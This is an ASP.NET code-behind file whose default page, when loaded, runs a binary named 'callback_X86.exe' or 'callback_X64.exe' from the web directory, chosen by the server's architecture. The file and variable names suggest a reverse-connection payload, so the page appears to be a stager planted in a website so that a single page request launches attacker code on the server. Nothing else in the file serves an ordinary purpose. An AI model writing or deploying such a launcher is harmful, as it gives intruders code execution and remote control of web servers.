using System;
using System.Data;
using System.Configuration;
using System.Collections;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Web.UI.HtmlControls;

public partial class _Default : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        // Get system architecture to know if which callback to execute
        string filename;
        string processor_arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
        string processor_archw6432 = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432");
        if (processor_arch.ToLower() == "x86" && String.IsNullOrEmpty(processor_archw6432))
        { // OS is 32bit
            filename = "callback_X86.exe";
        }
        else
        { // OS is 64bit
            filename = "callback_X64.exe";
        }
    
        // Get the full file path to callback
        string mosdef = Server.MapPath(filename);
    
        // Create the ProcessInfo object
        System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo(mosdef);
        psi.UseShellExecute = false;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardInput = true;
        psi.RedirectStandardError = true;
    
        // Start the process
        System.Diagnostics.Process proc = System.Diagnostics.Process.Start(psi);
    
        // Close the process
        proc.Close();
    }
}

